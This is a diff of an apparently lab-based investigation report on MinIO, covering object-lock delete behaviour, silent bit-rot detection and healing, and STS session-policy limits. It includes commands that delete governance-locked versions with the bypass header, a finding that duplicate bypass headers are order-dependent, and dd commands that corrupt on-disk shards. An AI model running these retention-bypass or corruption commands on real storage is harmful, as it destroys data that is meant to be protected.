 127.0.0.1:9000 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/c,D,N,a,e cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9000 X-Amz-Bypass-Governance-Retention: true
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: b6fb8ab4-9cab-409b-a047-09a0fc7d3f4b
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2bypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-bypass-governance-retention;x-amz-content-sha256;x-amz-date, Signature=9bd5ebb8256947e26872391b79f6b4259ed4f4b0190af0d24f9b1c021f38c64e
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2bypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-bypass-governance-retention;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 127.0.0.1:9000 X-Amz-Date: 20260714T205603Z
 127.0.0.1:9000
@@ -1354,7 +1508,7 @@ One representative audit record in full (the Compliance delete, `api.name=Delete
     "Accept-Encoding": "identity",
     "Amz-Sdk-Invocation-Id": "397ecf60-4512-4551-81f4-2cc7fbb4b7a4",
     "Amz-Sdk-Request": "attempt=1",
-    "Authorization": "AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=8b0e95dfffbef957fed81d42727d702e3259b6147300b41d5397b29b331ef5a4",
+    "Authorization": "AWS4-HMAC-SHA256 Credential=r2nobypassuser/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>",
     "Content-Length": "0",
     "User-Agent": "Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/c,e,N,D,a cfg/retry-mode#legacy Botocore/1.43.47",
     "X-Amz-Content-Sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
@@ -1406,6 +1560,135 @@ VERSION key=c3_gov versionId=ecce198f-3dde-41ff-b159-848506ca4f18 isLatest=True
 VERSION key=c4_gov versionId=b5a355e9-6fbb-4b27-a82f-ed66fa182de0 isLatest=True
 ```
 
+### Additional conditions — bypass-vs-lock matrix, delete-marker, and duplicate headers
+
+Conditions 1–5 above establish the primary matrix on bucket `r2bucket` (earlier run, `deploymentid=b3de8c20-51f3-4954-9a06-c02b2323ff40`). The following conditions complete every remaining distinct case the question implies. They were captured in the current verification run on a dedicated object-lock bucket `r2xbucket` (`deploymentid=67181563-9c2d-4fdb-864a-9f5fe2db445b`); the delete triggers run as `r2xbypassuser`, which **holds** `s3:BypassGovernanceRetention`. Object VersionIds: `lh_obj`=`431157c3-0e4c-428d-ad2d-e9db000fe108` (legal hold ON), `comp_obj`=`6381712c-e971-4206-8b2d-a9a7ba032b80` (COMPLIANCE 3d), `gov_vd_obj`=`e0329932-5771-435c-a74a-fd7a524fe038` (GOVERNANCE 3d), `gov_dup_obj`=`f71de399-33fe-4134-9666-f51bfccbdec9` (GOVERNANCE 3d).
+
+**Condition 6 — Legal Hold ON + bypass header + caller HAS `s3:BypassGovernanceRetention`** → **400 WORM**. [Observed] The governance-bypass grant does **not** defeat a legal hold.
+
+```python
+# delete as r2xbypassuser WITH BypassGovernanceRetention=True (boto3 sets x-amz-bypass-governance-retention:true)
+s3.delete_object(Bucket="r2xbucket", Key="lh_obj",
+                 VersionId="431157c3-0e4c-428d-ad2d-e9db000fe108",
+                 BypassGovernanceRetention=True)
+```
+```
+DELETE_ERROR_TYPE = InvalidRequest
+S3_Code    = InvalidRequest
+S3_Message = Object is WORM protected and cannot be overwritten
+HTTPStatus = 400
+```
+Complete `s3.DeleteObject` trace (`$OUT/trace_C6_legalhold_bypass.txt`) — note the bypass header **is** present and signed, yet the result is `400`:
+```
+127.0.0.1:9000 [REQUEST s3.DeleteObject] [2026-07-15T05:04:36.698] [Client IP: 127.0.0.1]
+127.0.0.1:9000 DELETE /r2xbucket/lh_obj?versionId=431157c3-0e4c-428d-ad2d-e9db000fe108
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=r2xbypassuser/20260715/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-bypass-governance-retention;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
+127.0.0.1:9000 X-Amz-Bypass-Governance-Retention: true
+127.0.0.1:9000 [RESPONSE] [2026-07-15T05:04:36.699] [ Duration 762µs TTFB 720.217µs ↑ 165 B  ↓ 359 B ]
+127.0.0.1:9000 400 Bad Request
+<Error><Code>InvalidRequest</Code><Message>Object is WORM protected and cannot be overwritten</Message><Key>lh_obj</Key><BucketName>r2xbucket</BucketName><Resource>/r2xbucket/lh_obj</Resource><RequestId>18C25E1BFD4A273E</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+```
+Audit record (compact; principal derived from the `Credential=` in `Authorization` — the raw signature is credential-sensitive and redacted per R4-MAJ-02):
+```jsonl
+{"condition":"Legal Hold + bypass + grant","api.name":"DeleteObject","statusCode":400,"status":"Bad Request","accessKey":"r2xbypassuser","bucket":"r2xbucket","object":"lh_obj","requestID":"18C25E1BFD4A273E","deploymentid":"67181563-9c2d-4fdb-864a-9f5fe2db445b"}
+```
+
+**Condition 7 — Compliance retention + bypass header + caller HAS `s3:BypassGovernanceRetention`** → **400 WORM**. [Observed] The governance-bypass grant does **not** defeat Compliance retention (Compliance is un-bypassable by anyone before expiry).
+
+```python
+s3.delete_object(Bucket="r2xbucket", Key="comp_obj",
+                 VersionId="6381712c-e971-4206-8b2d-a9a7ba032b80",
+                 BypassGovernanceRetention=True)
+```
+```
+DELETE_ERROR_TYPE = InvalidRequest
+S3_Code    = InvalidRequest
+S3_Message = Object is WORM protected and cannot be overwritten
+HTTPStatus = 400
+```
+```jsonl
+{"condition":"Compliance + bypass + grant","api.name":"DeleteObject","statusCode":400,"status":"Bad Request","accessKey":"r2xbypassuser","bucket":"r2xbucket","object":"comp_obj","deploymentid":"67181563-9c2d-4fdb-864a-9f5fe2db445b"}
+```
+
+Conditions 6 and 7 are the runtime confirmation of the *Rationale* below: because `enforceRetentionBypassForDelete` reaches the `BypassGovernanceRetentionAction` gate **only** in the Governance branch, neither Legal Hold nor Compliance has any bypass path — the grant is irrelevant to them.
+
+**Condition 8 — versionless DELETE on a Governance-locked object → 204 delete-marker; the locked version is untouched.** [Observed] Object-lock enforcement applies **only** to a version-specific DELETE; a versionless DELETE writes a delete marker and leaves the protected version in place.
+
+```python
+# BEFORE
+list_object_versions(Bucket="r2xbucket", Prefix="gov_vd_obj")
+# versionless DELETE (no VersionId), as r2xbypassuser
+s3.delete_object(Bucket="r2xbucket", Key="gov_vd_obj")
+# AFTER
+list_object_versions(Bucket="r2xbucket", Prefix="gov_vd_obj")
+```
+```
+--- BEFORE ---
+VERSION  key=gov_vd_obj versionId=e0329932-5771-435c-a74a-fd7a524fe038 isLatest=True
+--- versionless DELETE ---
+DELETE_STATUS = 204
+DeleteMarker  = True
+VersionId(new delete-marker) = 35f6082e-cfed-40cc-be5e-9fbaedc3297b
+--- AFTER ---
+VERSION  key=gov_vd_obj versionId=e0329932-5771-435c-a74a-fd7a524fe038 isLatest=False  (== locked? True)
+DELMARK  key=gov_vd_obj versionId=35f6082e-cfed-40cc-be5e-9fbaedc3297b isLatest=True
+original-version retention still present: GOVERNANCE
+```
+```jsonl
+{"condition":"versionless delete (delete-marker)","api.name":"DeleteObject","statusCode":204,"status":"No Content","accessKey":"r2xbypassuser","bucket":"r2xbucket","object":"gov_vd_obj","deploymentid":"67181563-9c2d-4fdb-864a-9f5fe2db445b"}
+```
+The original locked version `e0329932…` survives (now `isLatest=False`) with its GOVERNANCE retention intact; only a new delete marker `35f6082e…` was added. This is why the *Reproduction* targets an explicit `versionId` for every enforcement trigger.
+
+**Condition 9 — conflicting duplicate bypass headers are order-dependent (R2-MIN-02).** [Observed] When two `X-Amz-Bypass-Governance-Retention` header lines are sent, only the **first** is consulted. Both requests are by `r2xbypassuser` (who holds the grant) against the same Governance-locked version.
+
+```bash
+# C9a — order "false" then "true"  (first value = false -> no bypass)
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "r2xbypassuser:<REDACTED_USER_SECRET>" \
+     -H "X-Amz-Bypass-Governance-Retention: false" \
+     -H "X-Amz-Bypass-Governance-Retention: true" \
+     -X DELETE "http://127.0.0.1:9000/r2xbucket/gov_dup_obj?versionId=f71de399-33fe-4134-9666-f51bfccbdec9"
+```
+```
+HTTP 400
+<?xml version="1.0" encoding="UTF-8"?>
+<Error><Code>InvalidRequest</Code><Message>Object is WORM protected and cannot be overwritten</Message><Key>gov_dup_obj</Key><BucketName>r2xbucket</BucketName><Resource>/r2xbucket/gov_dup_obj</Resource><RequestId>18C25E3858D01251</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
+# locked version still present: True (survived)
+```
+```bash
+# C9b — order "true" then "false"  (first value = true -> bypass)
+curl --aws-sigv4 "aws:amz:us-east-1:s3" --user "r2xbypassuser:<REDACTED_USER_SECRET>" \
+     -H "X-Amz-Bypass-Governance-Retention: true" \
+     -H "X-Amz-Bypass-Governance-Retention: false" \
+     -X DELETE "http://127.0.0.1:9000/r2xbucket/gov_dup_obj?versionId=f71de399-33fe-4134-9666-f51bfccbdec9"
+```
+```
+HTTP 204
+# (empty body) — locked version still present: False (DELETED)
+```
+**[Source-grounded]** The order-dependence is exactly `IsObjectLockGovernanceBypassSet` at `internal/bucket/object/lock/lock.go:404`, whose body (`:405`) is `return strings.EqualFold(h.Get(AmzObjectLockBypassRetGovernance), "true")`. Go's `http.Header.Get` returns the **first** value for a key, so `false,true` reads `false` (→ `400`) while `true,false` reads `true` (→ `204`). Per the read-only investigation constraint this is reported as observed source behavior, not remediated.
+
+**Methodological note (R2-MIN-01) — why locks are set with `mc`, not boto3. [Observed]** MinIO requires a `Content-MD5` header on `PutObjectRetention` and `PutObjectLegalHold`; boto3 1.43.47 does **not** send it, so those two calls fail:
+
+```python
+s3.put_object_retention(Bucket="r2xbucket", Key="md5probe", VersionId=vid,
+    Retention={"Mode":"GOVERNANCE","RetainUntilDate":until})
+s3.put_object_legal_hold(Bucket="r2xbucket", Key="md5probe", VersionId=vid,
+    LegalHold={"Status":"ON"})
+```
+```
+# put_object_retention:
+ERROR_TYPE = ClientError
+S3_Code    = MissingContentMD5
+S3_Message = Missing required header for this request: Content-Md5.
+HTTPStatus = 400
+# put_object_legal_hold:
+ERROR_TYPE = ClientError
+S3_Code    = MissingContentMD5
+S3_Message = Missing required header for this request: Content-Md5.
+HTTPStatus = 400
+```
+The canonical `mc` client sends the required header, so all locks in this section are provisioned with `mc legalhold set` / `mc retention set` (which succeed, as shown in *Reproduction*). The boto3 driver is used only for `putobj`, `delver`, and `listver`, which are unaffected. This is a client-side (boto3) requirement, not a server defect.
+
 ### Responsible Code
 
 All enforcement is in `enforceRetentionBypassForDelete` at `cmd/bucket-object-lock.go:84`. **[Source-grounded]** anchors, verified at HEAD:
@@ -1448,7 +1731,7 @@ All enforcement is in `enforceRetentionBypassForDelete` at `cmd/bucket-object-lo
 **[Observed]** Manually corrupting an on-disk shard (`part.1`) and then issuing a GET triggers MinIO's per-shard **HighwayHash** verification, which detects the corruption as `errFileCorrupt`. What happens next depends on whether parity is available:
 
 - **Multi-drive erasure set (4 drives, EC:2) — [Observed]:** the GET **succeeds with HTTP 200 and byte-for-byte-correct data** (the returned body's SHA-256 equals the original), because the corrupt shard is detected during read and the object is **reconstructed in memory** from the remaining shards. **No dedicated bit-rot entry is written to the server error log or the audit log, and `mc admin logs` shows nothing.** The only runtime signals are visible via `mc admin trace -a` (all-calls): the internal `storage.ReadFileStream` **re-read pattern** (an extra shard is read after the corrupt one fails its hash), followed ~1 second later by an asynchronous **`[HEALING heal.Object] … mode=0 …`** trace entry — the MRF (Metadata-Refresh/heal) operation queued by the read path.
-- **The queued `mode=0` (normal-scan) heal does NOT repair the on-disk corruption — [Observed]:** because a normal scan only checks part existence/size (which are intact), the corrupt shard **remains corrupt on disk** after the GET. Only an explicit **deep scan** (`mc admin heal --scan deep`), which recomputes the HighwayHash, detects the object as degraded (`Yellow → Green`) and **rewrites the shard to its original bytes**.
+- **The queued `mode=0` (`HealUnknownScan`) heal does NOT repair the on-disk corruption — [Observed]:** the asynchronous MRF heal runs with **`mode=0`, which is `HealUnknownScan` — the zero value of `madmin.HealScanMode` — *not* `HealNormalScan` (which is `1`)** (enum cited under *Responsible Code*). A `HealUnknownScan` scan (like a normal scan) validates only part existence/size — both intact after a same-size overwrite — so the corrupt shard **remains corrupt on disk** after the GET. Notably, the read path *does* compute the correct (deep) intent — it flags `BitrotScan: true` (`cmd/erasure-object.go:407`) and `cmd/mrf.go:260-263` maps that to `HealDeepScan` — but the background heal sequence **discards that scan mode**: `healSequence.healObject` queues the task with `opts: &h.settings` and ignores its `scanMode` argument (`cmd/admin-heal-ops.go:916-926`), while `newBgHealSequence` never sets `ScanMode` (`cmd/global-heal.go:53-56`), leaving it at the `HealUnknownScan` zero value. Consequently only an explicit **deep scan** (`mc admin heal --scan deep`), which recomputes the HighwayHash, detects the object as degraded (`Yellow → Green`) and **rewrites the shard to its original bytes**. *(This dropped-scan-mode behaviour is reported strictly as observed; per the read-only constraint it is documented, not remediated.)*
 - **Single drive (no parity) — [Observed]:** the same detection makes the object **unreadable**; the GET returns **HTTP 503 `SlowDownRead`** ("Resource requested is unreadable") — detection *without* reconstruction.
 
 So the precise answer to "what specific runtime logs appear during the subsequent GET": on a redundant set there is **no bit-rot log line at all** — detection and reconstruction are silent at the log level; the observable evidence is the successful reconstructed GET plus the `heal.Object` entry in the all-calls trace. On a non-redundant set the GET fails with `503 SlowDownRead`. Both results were reproduced twice.
@@ -1473,7 +1756,7 @@ dd if=/tmp/ffblock of=<d1-part.1> bs=1 seek=100000 count=128 conv=notrunc
 sync; echo 3 > /proc/sys/vm/drop_caches
 # 6) GET and verify the returned bytes; capture trace (use -a for internal storage/heal calls)
 nohup $MC admin trace -a -v inv9100 > $OUT/trace_all_cycle2.txt 2>&1 &
-python3 $INV/scripts/r3_get.py http://127.0.0.1:9100 minioadmin minioadmin r3bucket r3obj
+python3 $INV/scripts/r3_get.py http://127.0.0.1:9100 minioadmin <REDACTED_ROOT_PASSWORD> r3bucket r3obj
 # 7) heal behaviour: normal scan vs deep scan
 $MC admin heal --recursive             inv9100/r3bucket/r3obj   # normal (metadata) scan
 $MC admin heal --recursive --scan deep inv9100/r3bucket/r3obj   # deep (HighwayHash) scan
@@ -1609,7 +1892,7 @@ Complete `s3.GetObject` request/response block from the all-calls trace (200 OK,
 127.0.0.1:9100 Accept-Encoding: identity
 127.0.0.1:9100 Amz-Sdk-Invocation-Id: 71eda3d9-dbf3-4ec6-b29f-5113ec8991e5
 127.0.0.1:9100 Amz-Sdk-Request: attempt=1
-127.0.0.1:9100 Authorization: AWS4-HMAC-SHA256 Credential=minioadmin/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-mode;x-amz-content-sha256;x-amz-date, Signature=1bff625c037c5ad3b9f3b2fa70c445b1731b353dc46113b4c353dda262afaa12
+127.0.0.1:9100 Authorization: AWS4-HMAC-SHA256 Credential=minioadmin/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-mode;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9100 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/e,N,Z,b,D cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9100 X-Amz-Checksum-Mode: ENABLED
 127.0.0.1:9100 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
@@ -1649,7 +1932,7 @@ grep -E 'HEALING|heal.Object'   $OUT/trace_all_cycle2.txt
 127.0.0.1:9100  [HEALING heal.Object] [2026-07-14T21:10:46.879] r3bucket/r3obj mode=0 remove=true version-id=null disks=4 dry=false 289.554µs 1.0 MiB
 ```
 
-Three `ReadFileStream` calls are made for a 2-data-shard object: d4 and d1 are read concurrently at `…45.822`, then d2 is read ~19 ms later at `…45.841` — the extra read is the reconstruction re-trigger fired when corrupt **d1** fails its HighwayHash check. The `[HEALING heal.Object] … mode=0 …` line fires ~1 s **after** the response — the asynchronous MRF heal.
+Three `ReadFileStream` calls are made for a 2-data-shard object: d4 and d1 are read concurrently at `…45.822`, then d2 is read ~19 ms later at `…45.841` — the extra read is the reconstruction re-trigger fired when corrupt **d1** fails its HighwayHash check. The `[HEALING heal.Object] … mode=0 …` line fires ~1 s **after** the response — the asynchronous MRF heal. The trace's `mode` field is `fmt.Sprint(opts.ScanMode)` (`cmd/erasure-healing.go:1103`), so **`mode=0` is `HealUnknownScan`**, not `HealNormalScan` (`1`) — see the enum under *Responsible Code*.
 
 This GET also produced **0 new server-log lines**, and immediately afterwards the d1 shard was **still corrupt on disk** (SHA-256 unchanged from the post-corruption value above) — confirming the client was served from in-memory reconstruction, not from an on-disk repair.
 
@@ -1704,7 +1987,7 @@ Complete first `s3.GetObject` attempt from the trace — **HTTP 503 `SlowDownRea
 127.0.0.1:9000 X-Amz-Checksum-Mode: ENABLED
 127.0.0.1:9000 X-Amz-Date: 20260714T211247Z
 127.0.0.1:9000 Amz-Sdk-Request: attempt=1
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=minioadmin/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-mode;x-amz-content-sha256;x-amz-date, Signature=2cf8647882b9cc02fc3f66df6b1a5930f41aec434924764235275d592be3e8ab
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=minioadmin/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-mode;x-amz-content-sha256;x-amz-date, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/Z,b,N,D,e cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9000 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 127.0.0.1:9000 <BLOB>
@@ -1780,10 +2063,42 @@ This GET, too, produced 0 new server-log lines.
   })
   ```
   There is **no `logger.*` call anywhere on this detection path** (verified: `grep -n 'logger\.' cmd/bitrot-streaming.go cmd/erasure-decode.go` returns nothing) — which is why the detection is silent in the server log and audit log.
+- **Heal scan-mode enum + the dropped-scan-mode chain (why the async heal runs `mode=0`)** — the trace's `mode` field is the integer value of `madmin.HealScanMode`, defined in `github.com/minio/madmin-go/v3/heal-commands.go:33-45`:
+  ```go
+  // HealScanMode represents the type of healing scan
+  type HealScanMode int
+
+  const (
+      // HealUnknownScan default is unknown
+      HealUnknownScan HealScanMode = iota            // 0
+
+      // HealNormalScan checks if parts are present and not outdated
+      HealNormalScan                                 // 1
+
+      // HealDeepScan checks for parts bitrot checksums
+      HealDeepScan                                   // 2
+  )
+  ```
+  So `mode=0` in the trace is **`HealUnknownScan`**, not `HealNormalScan`. The read path computes the *correct* (deep) intent, but it is discarded before the queued task runs:
+  - `cmd/erasure-object.go:407` — the read flags bit-rot: `BitrotScan: errors.Is(err, errFileCorrupt)` (here `true`).
+  - `cmd/mrf.go:260-263` — that flag is mapped to a scan mode, then dispatched at `:277`:
+    ```go
+    scan := madmin.HealNormalScan
+    if u.BitrotScan {
+        scan = madmin.HealDeepScan
+    }
+    ```
+  - `cmd/global-heal.go:591-597` — the package-level `healObject` forwards it faithfully: `bgSeq.healObject(bucket, object, versionID, scan)`.
+  - **`cmd/admin-heal-ops.go:916-926`** — the drop: `func (h *healSequence) healObject(bucket, object, versionID string, scanMode madmin.HealScanMode)` queues `healSource{…, opts: &h.settings}` and **never uses its `scanMode` parameter**.
+  - `cmd/global-heal.go:53-56` — the effective mode is therefore the sequence default: `newBgHealSequence` builds `madmin.HealOpts{Remove: healDeleteDangling}` and never sets `ScanMode`, so `h.settings.ScanMode == HealUnknownScan` (`0`).
+  - `cmd/erasure-healing.go:1103` — `healTrace` emits `"mode": fmt.Sprint(opts.ScanMode)`, which is why the observed value is `mode=0`.
+  - `cmd/erasure-healing.go:1080-1084` — `HealObject`'s built-in "re-heal with deep scan if `errFileCorrupt`" self-upgrade does not compensate, because a non-deep scan does not *return* `errFileCorrupt` for a same-size overwrite.
+
+  *(Reported strictly as observed, source-grounded behaviour; per the read-only constraint it is documented here, not remediated in source.)*
 
 ### Rationale
 
-**[Observed] + [Source-grounded]** The HighwayHash written next to each shard on upload is recomputed on every read (`bitrot-streaming.go:184`). A manual `dd` overwrite changes the shard's data but not its stored hash, so the compare fails and `ReadAt` returns `errFileCorrupt`. On a redundant set, `parallelReader` treats that shard as unusable, reads a parity shard instead (`erasure-decode.go:197-198`), reconstructs the block, and returns it to the client while flagging a heal (`:227-228`) — hence the observed **200 with correct bytes** and the extra `ReadFileStream`. The heal queued by `getObjectWithFileInfo` (`erasure-object.go:400`) is a `mode=0` normal scan, which validates part size/existence only; since the corrupt shard has the correct size, the normal scan reports `Green → Green` and does **not** rewrite it — matching the observation that the on-disk shard stays corrupt until an explicit **deep** scan (`Yellow → Green`) recomputes the hash and repairs it. On a single drive there is no parity to reconstruct from, so the same `errFileCorrupt` surfaces to the client as `503 SlowDownRead`. Because no code on this path logs, the "specific runtime logs generated during a subsequent get request" are, on a redundant set, **none at the error-log level** — the evidence is the reconstructed 200 and the asynchronous `heal.Object` trace entry.
+**[Observed] + [Source-grounded]** The HighwayHash written next to each shard on upload is recomputed on every read (`bitrot-streaming.go:184`). A manual `dd` overwrite changes the shard's data but not its stored hash, so the compare fails and `ReadAt` returns `errFileCorrupt`. On a redundant set, `parallelReader` treats that shard as unusable, reads a parity shard instead (`erasure-decode.go:197-198`), reconstructs the block, and returns it to the client while flagging a heal (`:227-228`) — hence the observed **200 with correct bytes** and the extra `ReadFileStream`. The heal queued by `getObjectWithFileInfo` (`erasure-object.go:399-409`) runs as **`mode=0` = `HealUnknownScan`** (the trace `mode` field is `fmt.Sprint(opts.ScanMode)`, `erasure-healing.go:1103`) which — like a normal scan — validates part size/existence only; since the corrupt shard has the correct size, it reports `Green → Green` and does **not** rewrite it. This `mode=0` is itself the symptom of a **dropped scan mode**: the read path flags `BitrotScan: true` (`erasure-object.go:407`) and `mrf.go:260-263` maps that to `HealDeepScan`, but `healSequence.healObject` (`admin-heal-ops.go:916-926`) queues the task with `opts: &h.settings` and ignores its `scanMode` argument, and `newBgHealSequence` (`global-heal.go:53-56`) never sets `ScanMode`, so the effective mode is the `HealUnknownScan` zero value. The compensating self-upgrade in `HealObject` (`erasure-healing.go:1080-1084` — "re-heal with deep scan if `errFileCorrupt`") never triggers either, because a non-deep scan does not *return* `errFileCorrupt` for a same-size overwrite (it never recomputes the hash). The on-disk shard therefore stays corrupt until an explicit **deep** scan (`Yellow → Green`) recomputes the hash and repairs it. On a single drive there is no parity to reconstruct from, so the same `errFileCorrupt` surfaces to the client as `503 SlowDownRead`. Because no code on this path logs, the "specific runtime logs generated during a subsequent get request" are, on a redundant set, **none at the error-log level** — the evidence is the reconstructed 200 and the asynchronous `heal.Object` trace entry.
 
 ---
 
@@ -1841,7 +2156,7 @@ Inline session policy `r4sessionpolicy.json` (narrow — Get only, **no** Put):
 $MC mb -p inv9000/r4bucket
 printf 'r4-seed-object-body' | $MC pipe inv9000/r4bucket/r4obj
 $MC admin policy create inv9000 r4parent $INV/policies/r4parentpolicy.json
-$MC admin user add inv9000 r4parentuser <REDACTED_USER_SECRET>
+$MC admin user add inv9000 r4parentuser "$USER_SECRET"
 $MC admin policy attach inv9000 r4parent --user r4parentuser
 # then run the driver subcommands below
 ```
@@ -1937,7 +2252,7 @@ elif cmd == "assume_toobig":
 **Parent baseline. [Observed]** With the parent's long-term credentials, both GET and PUT succeed:
 
 ```bash
-python3 $INV/scripts/r4_sts_test.py parent_baseline r4parentuser <REDACTED_USER_SECRET>
+python3 $INV/scripts/r4_sts_test.py parent_baseline r4parentuser "$USER_SECRET"
 ```
 
 ```
@@ -1948,7 +2263,7 @@ PARENT PutObject  -> HTTP 200
 **AssumeRole — one session. [Observed]** The issued temporary `AccessKeyId` equals the JWT session-token's `accessKey` claim (`CORRELATION_MATCH = True`); the secret is redacted (ephemeral, torn down):
 
 ```bash
-python3 $INV/scripts/r4_sts_test.py assume r4parentuser <REDACTED_USER_SECRET> $INV/policies/r4sessionpolicy.json
+python3 $INV/scripts/r4_sts_test.py assume r4parentuser "$USER_SECRET" $INV/policies/r4sessionpolicy.json
 ```
 
 ```
@@ -1983,7 +2298,7 @@ Complete `s3.GetObject` trace — note `Credential=MYLCK9PTJE73DS0ADU0Y…` and 
 127.0.0.1:9000 X-Amz-Content-Sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 127.0.0.1:9000 Accept-Encoding: identity
 127.0.0.1:9000 Amz-Sdk-Invocation-Id: 8dc37e98-741f-41e1-99cc-dc96f4a692cf
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=MYLCK9PTJE73DS0ADU0Y/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-mode;x-amz-content-sha256;x-amz-date;x-amz-security-token, Signature=c496220c971fb453911aa555b7d7e937bda59c566a982e5e86f917c4cd06ce9e
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=MYLCK9PTJE73DS0ADU0Y/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-mode;x-amz-content-sha256;x-amz-date;x-amz-security-token, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/N,b,D,Z,e cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9000 X-Amz-Date: 20260714T212116Z
 127.0.0.1:9000 X-Amz-Security-Token: <REDACTED_SESSION_TOKEN_JWT>
@@ -2034,7 +2349,7 @@ Complete `s3.PutObject` trace — the **same** `Credential=MYLCK9PTJE73DS0ADU0Y�
 127.0.0.1:9000 Expect: 100-continue
 127.0.0.1:9000 User-Agent: Boto3/1.43.47 md/Botocore#1.43.47 ua/2.1 os/linux#6.6.122+ md/arch#x86_64 lang/python#3.13.7 md/pyimpl#CPython m/N,e,D,Z,U,b cfg/retry-mode#legacy Botocore/1.43.47
 127.0.0.1:9000 X-Amz-Checksum-Crc32: 7/gCLA==
-127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=MYLCK9PTJE73DS0ADU0Y/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-crc32;x-amz-content-sha256;x-amz-date;x-amz-sdk-checksum-algorithm;x-amz-security-token, Signature=dd6722c6932a9bc4cc59d8dc4c3a56bb07fdca84b037945070d554f320f5b0f9
+127.0.0.1:9000 Authorization: AWS4-HMAC-SHA256 Credential=MYLCK9PTJE73DS0ADU0Y/20260714/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-checksum-crc32;x-amz-content-sha256;x-amz-date;x-amz-sdk-checksum-algorithm;x-amz-security-token, Signature=<REDACTED_SIGV4_SIGNATURE>
 127.0.0.1:9000 X-Amz-Content-Sha256: 73f750ce341070e30c196424e563bd324367a4af1011fdbc43952fb228d5252b
 127.0.0.1:9000 <BLOB>
 127.0.0.1:9000 [RESPONSE] [2026-07-14T21:21:21.501] [ Duration 543µs TTFB 500.136µs ↑ 209 B  ↓ 335 B ]
@@ -2068,7 +2383,7 @@ Complete `s3.PutObject` trace — the **same** `Credential=MYLCK9PTJE73DS0ADU0Y�
 **Inline session-policy size cap (2,048 bytes). [Observed]** An inline policy of 2,230 bytes is rejected at `AssumeRole`:
 
 ```bash
-python3 $INV/scripts/r4_sts_test.py assume_toobig r4parentuser <REDACTED_USER_SECRET>
+python3 $INV/scripts/r4_sts_test.py assume_toobig r4parentuser "$USER_SECRET"
 ```
 
 ```
@@ -2078,6 +2393,35 @@ ASSUMEROLE -> ERROR ClientError
   Message = Session policy should not exceed 2048 characters
   HTTP    = 400
 ```
+
+**Precision — the 2,048-byte cap applies to the parsed, canonically *re-marshaled* policy, not the raw request bytes. [Observed]** `populateSessionPolicy` (`cmd/sts-handlers.go:94-129`) reads the raw inline policy string (`sessionPolicyStr := form.Get(stsPolicy)`, `:99`), **parses** it (`policy.ParseConfig`, `:104`), **re-marshals** it to canonical JSON (`policyBuf, err := json.Marshal(sessionPolicy)`, `:114`), and applies the cap to **`len(policyBuf)`** (`if len(policyBuf) > maxSTSSessionPolicySize`, `:123`) — i.e. to the canonical form, never to the raw request bytes. Two runtime probes make the enforced dimension exact:
+
+*Case A — a whitespace-padded raw policy far larger than 2,048 bytes is **accepted**, because its canonical form is tiny:*
+
+```bash
